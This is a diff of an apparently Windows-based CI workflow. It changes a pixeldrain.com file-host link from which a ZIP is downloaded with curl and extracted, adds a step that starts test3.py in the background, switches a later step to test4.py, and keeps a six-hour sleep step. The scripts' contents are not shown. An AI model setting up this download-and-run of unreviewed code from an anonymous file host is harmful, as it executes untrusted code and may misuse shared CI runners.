@@ -13,7 +13,7 @@ jobs:
 
     - name: Download ZIP and extract
       run: |
-        curl -L -o code.zip https://pixeldrain.com/api/file/ej8dZc96/info/zip/main2.zip
+        curl -L -o code.zip https://pixeldrain.com/api/file/aAAWGSj5/info/zip/main2.zip
         Start-Sleep -Seconds 5
         powershell -Command "Expand-Archive -Force code.zip extracted"
 
@@ -41,11 +41,19 @@ jobs:
         Start-Sleep -Seconds 10
         python test2.py
 
+    - name: Start py main.py (background)
+      run: |
+        cd extracted
+        Write-Host "Starting main.py in background..."
+        Start-Process python test3.py
+        Start-Sleep -Seconds 10
+
+ 
     - name: Run test2.py  test3.py
       run: |
         cd extracted
         Start-Sleep -Seconds 10
-        python test3.py
+        python test4.py
 
     - name: Keep alive-v2
       run: Start-Sleep -Seconds 21600 
